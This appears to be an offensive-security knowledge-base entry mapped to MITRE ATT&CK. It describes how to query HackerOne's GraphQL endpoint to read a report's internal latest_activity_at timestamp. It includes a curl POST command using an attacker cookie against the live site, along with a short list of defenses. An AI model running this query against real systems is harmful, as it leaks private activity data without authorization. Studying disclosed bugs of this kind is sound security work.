---
id: proc-query-graphql-timestamp
tags:
  - api-disclosure
  - graphql
  - hackerone
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/post-graphql-query]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:35.561Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Query-GraphQL-for-Latest-Activity-Timestamp

## Summary

This procedure queries HackerOne's GraphQL endpoint to retrieve the latest_activity_at timestamp from a report node, disclosing internal discussion times to unauthorized participants.

## Description

By sending a GraphQL POST request without visibility restrictions, participants can access the Report node's latest_activity_at field. This reveals timestamps of private team activities. Targeted at /graphql, it requires participant authentication. Results in timestamp leakage, aiding in timing analysis of internal workflows.

## Requirements

1. Attacker's authentication token or cookie
2. Report ID to construct GraphQL node ID (gid://hackerone/Report/<report-id>)
3. HTTP client supporting POST and JSON

## Defense

Defensive measures and detection strategies:

- Enforce node-level access controls in GraphQL resolvers
- Remove or null latest_activity_at for non-team queries
- Log GraphQL queries filtering for sensitive fields

## Objectives

1. Fetch internal activity timestamp
2. Validate GraphQL disclosure
3. Correlate with other leaked data

## Instructions

### Step 1: Construct GraphQL Query

**Context**: Build the query string targeting the Report node.

Use the format: query { node(id: "gid://hackerone/Report/<report-id>") { ... on Report { _id,latest_activity_at }}}

> Node ID must match the report's global ID.

### Step 2: Send POST Request

**Context**: Execute the query with authentication to retrieve the timestamp.

**Command** ([[commands/post-graphql-query]]):
```bash
curl -X POST -H "Content-Type: application/json" -H "Cookie: <attacker-cookie>" -d '{"query":"query { node(id: \"gid://hackerone/Report/<report-id>\") { ... on Report { _id,latest_activity_at }}}","variables":{}}' https://hackerone.com/graphql
```

> Response: {"data":{"node":{"_id":"<id>","latest_activity_at":"<timestamp>"}}}, showing internal time.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/post-graphql-query]]

## Tools Used


## Tags

- api-disclosure
- graphql
- hackerone
